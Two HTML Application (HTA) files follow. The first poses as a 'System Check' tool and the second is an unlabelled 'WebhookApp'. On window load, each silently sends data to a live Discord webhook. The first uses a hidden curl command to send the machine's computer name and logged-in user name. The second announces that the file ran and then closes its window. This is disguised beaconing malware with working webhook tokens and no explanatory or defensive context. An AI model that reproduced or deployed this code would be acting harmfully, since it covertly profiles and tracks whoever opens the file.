<html>
<head>
  <title>System Info</title>
  <HTA:APPLICATION
    ID="sysinfo"
    APPLICATIONNAME="SystemInfo"
    BORDER="dialog"
    BORDERSTYLE="normal"
    INNERBORDER="no"
    MAXIMIZEBUTTON="no"
    MINIMIZEBUTTON="no"
    SYSMENU="yes"
    SINGLEINSTANCE="yes"
  />
</head>
<script language="VBScript">
  Sub Window_OnLoad
    window.resizeTo 350, 180
    window.moveTo (screen.availWidth - 350) / 2, (screen.availHeight - 180) / 2
    
    Dim shell, pc, user, cmd, output
    
    pc = CreateObject("WScript.Network").ComputerName
    user = CreateObject("WScript.Network").UserName
    
    Set shell = CreateObject("WScript.Shell")
    cmd = "cmd /c cd /d %TEMP% && curl -s -X POST -H ""Content-Type: application/json"" -d ""{\""content\"":\""**PC check** | " & pc & " | " & user & "\""}"" https://discord.com/api/webhooks/1562944722320752655/ibW4rs9GgxJr6ozQsj0BGufEGR-BaoKTkMMRkwQjsuhwIMYU7JQxDKTkoHn81AYU_aQ1"
    shell.Run cmd, 0, True
    
    document.getElementById("status").innerHTML = "Done! " & pc & " / " & user
  End Sub
</script>
<body style="font-family:system-ui;background:#0d1117;color:#c9d1d9;text-align:center;padding:20px">
  <h2 style="color:#58a6ff">System Check</h2>
  <p id="status">Running...</p>
</body>
</html>
<html>
<head>
    <title>Executável HTA</title>
    <HTA:APPLICATION 
        APPLICATIONNAME="WebhookApp" 
        BORDER="thin" 
        SCROLL="no" 
        SINGLEINSTANCE="yes"
    >
    <script language="VBScript">
        Sub Window_OnLoad
            Dim webhookURL
            webhookURL = "https://discord.com/api/webhooks/1530744195407413440/lhd_49jAt3ZGW7CF0tDgmmwIVGB2cltSD9TB8p8J5AcBQE17CfkIWJQi_F3zoRgTQDik"

            Dim jsonPayload
            jsonPayload = "{""content"": ""O HTA foi executado com sucesso no PC!""}"

            Dim http
            Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")

            On Error Resume Next
            http.Open "POST", webhookURL, False
            http.setRequestHeader "Content-Type", "application/json"
            http.Send jsonPayload
            On Error GoTo 0

            window.close()
        End Sub
    </script>
</head>
<body>
</body>
</html>
